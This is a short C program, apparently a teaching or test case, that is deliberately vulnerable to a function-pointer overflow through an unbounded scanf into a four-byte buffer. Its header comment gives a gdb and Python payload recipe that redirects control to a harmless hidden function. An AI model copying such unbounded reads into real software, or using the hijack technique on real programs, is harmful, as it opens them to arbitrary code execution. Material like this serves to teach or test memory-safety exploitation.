/*
 * T4_function_pointer_overflow
 *
 * This program has a function pointer overflow due to an unbounded write
 * to a char array. The user can override the address the function pointer
 * points to to an arbitrary location, which practically gives them ACE.
 *
*
 * If you want to run this file I recommend using the following compiler flags.
 *  -g -fno-stack-protector -no-pie
 *
 * Find the address of the super_secret_function_DONOTCALL function with `p &super_secret_function_DONOTCALL`
 * Convert the address to 4 bytes in little-endian order
 *
 * Feed the program 4 characters and the payload afterwards.
 *
 * For example:
 *
 * (gdb) p &super_secret_function_DONOTCALL
 * $1 = (void (*)()) 0x400557 <super_secret_function_DONOTCALL>
 *
 * python3 -c "import sys; sys.stdout.buffer.write(b'AAAA' + 0x400557.to_bytes(4, byteorder='little'))" | a.out
 *
 * Now the program should output "bingus bongus sproingus" instead of "cleaned up".
 */

#include <stdio.h>
#include <stdlib.h>

void super_secret_function_DONOTCALL() {
    puts("bingus bongus sproingus.");
}

void cleanup() {
    puts("Cleaned up!");
}

int main() {
    void (*cleanup_callback)();
    cleanup_callback = &cleanup;

    puts("What ID do you want to load?");
    char id[4];
    scanf("%s", id);

    cleanup_callback();

    return 0;
}
